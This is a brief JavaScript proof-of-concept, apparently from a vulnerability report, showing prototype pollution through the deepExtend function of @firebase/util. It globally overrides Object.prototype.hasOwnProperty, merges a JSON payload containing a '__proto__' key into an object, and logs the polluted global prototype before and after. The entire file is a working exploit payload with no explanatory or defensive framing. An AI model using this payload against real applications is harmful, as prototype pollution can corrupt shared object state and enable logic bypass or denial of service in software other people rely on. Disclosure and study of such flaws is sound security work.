Object.prototype.hasOwnProperty = () => true;
console.log({}.polluted);
const util = require('@firebase/util');
var payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
const a = {
    nest: {
        number: 1,
        string: '1',
        object: { key: '1' },
        date: new Date(1),
        nest: { a: 1 }
    }
};
var result = util.deepExtend(a, payload);
console.log({}.polluted);